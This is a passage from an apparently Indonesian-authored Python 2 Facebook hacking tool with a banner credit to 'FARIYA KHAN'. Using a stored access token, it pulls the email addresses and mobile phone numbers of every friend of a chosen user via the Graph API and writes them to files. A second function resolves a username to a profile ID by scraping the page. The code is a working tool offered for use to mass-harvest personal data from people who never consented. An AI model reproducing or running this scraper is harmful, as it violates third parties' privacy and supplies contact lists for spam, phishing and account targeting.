				print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "\033[1;97m ⚔«--------------------------------------------»⚔"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

def phonex():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		print "\033[1;97m ⚔«--------------------------------------------»⚔"
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
		print "\033[1;97m ⚔«--------------------------------------------»⚔"
		bz = open('out/no_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hpfromteman.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "\033[1;97m ⚔«--------------------------------------------»⚔"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

def numericx():
    try:
       os.system('clear')
       print"""
\033[1;93m _____ _           _   ___ ____    _____ ____
\033[1;94m|  ___(_)_ __   __| | |_ _|  _ \  |  ___| __ )
\033[1;93m| |_  | | '_ \ / _` |  | || | | | | |_  |  _ \
\033[1;94m|  _| | | | | | (_| |  | || |_| | |  _| | |_) |
\033[1;93m|_|   |_|_| |_|\__,_| |___|____/  |_|   |____/

\033[1;97m______________________________________________

\033[1;96mCREATOR \033[1;91m║──➣\033[1;93m FARIYA KHAN 
\033[1;96mFACEBOOK\033[1;91m║──➣\033[1;93m m.facebook.com/Faritricker007

\033[1;97m______________________________________________
"""
       u = raw_input('Enter Username > ')
       url = 'https://www.facebook.com/'+u
       r = requests.get(url).text
       name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
       id = re.search('profile/(.*?)" ', r).group(1)

       print '\nNAME > '+name
       print 'ID   > '+id+'\n'
 
    except requests.exceptions.ConnectionError:
 	print 'Koneksi tidak ada'
    except AttributeError:
	print 'Username tidak di temukan'
    
    print "\033[1;97m ⚔«--------------------------------------------»⚔"




 

    
if __name__ == '__main__':
	login()


